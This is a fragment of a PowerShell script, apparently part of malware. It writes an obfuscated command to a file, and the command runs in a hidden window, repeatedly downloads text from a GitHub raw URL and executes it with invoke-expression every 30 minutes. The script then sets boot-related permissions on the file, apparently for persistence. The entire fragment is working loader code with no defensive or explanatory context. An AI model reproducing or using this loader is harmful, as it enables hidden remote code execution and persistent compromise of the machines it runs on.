...
$content = "cmd /c start /min powershell start-process powershell {while(`$true){[string]`$awdsdsadas={(Nxsderwtyuhvew-Obxsderwtyuhvject Nxsderwtyuhvet.WxsderwtyuhvebClxsderwtyuhvient).Dowxsderwtyuhvnloadsxsderwtyuhvtring('hxsderwtyuhvttpxsderwtyuhvs:/xsderwtyuhv/rxsderwtyuhvaw.gixsderwtyuhvthubuserconxsderwtyuhvtent.cxsderwtyuhvom/musxsderwtyuhvai51/yanxsderwtyuhvni/maxsderwtyuhvin/intxsderwtyuhvro.txsderwtyuhvxt')};`$dfsfsdf=`$awdsdsadas.Replace('xsderwtyuhv','');`$bvcbvcv=iex `$dfsfsdf;invoke-expression `$bvcbvcv;start-sleep -s 1800}} -windowstyle hidden"
sc $paFile $content
Set_bootACL($paFile)
